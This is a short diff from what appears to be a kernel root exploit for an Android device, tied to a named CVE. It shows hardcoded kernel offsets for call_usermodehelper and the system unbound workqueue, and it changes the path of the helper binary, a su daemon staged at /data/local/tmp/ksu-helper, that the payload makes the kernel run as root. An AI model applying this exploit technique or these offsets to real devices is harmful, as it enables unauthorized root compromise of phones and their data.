@@ -275,7 +275,14 @@
 #define PIPE_USER_PAGES_HARD_IMAGE \
   (KIMAGE_TEXT_BASE + PIPE_USER_PAGES_HARD_OFF)
 
-#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
+/*
+ * Both the standalone chain and the app payload target this path.  The RMG
+ * app's Shizuku bridge stages its helper (libcve43499root.so = su_daemon) as
+ * /data/local/tmp/ksu-helper, so the A25 (non-APP flags) payload executes that
+ * exact file for --umh root.  For direct adb testing, place a copy at the same
+ * path.
+ */
+#define ROOT_UMH_PATH "/data/local/tmp/ksu-helper"
 #define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000f6be4ULL
 #define SYSTEM_UNBOUND_WQ_OFF 0x01df9e10ULL
 #define CALL_USERMODEHELPER_EXEC_WORK \
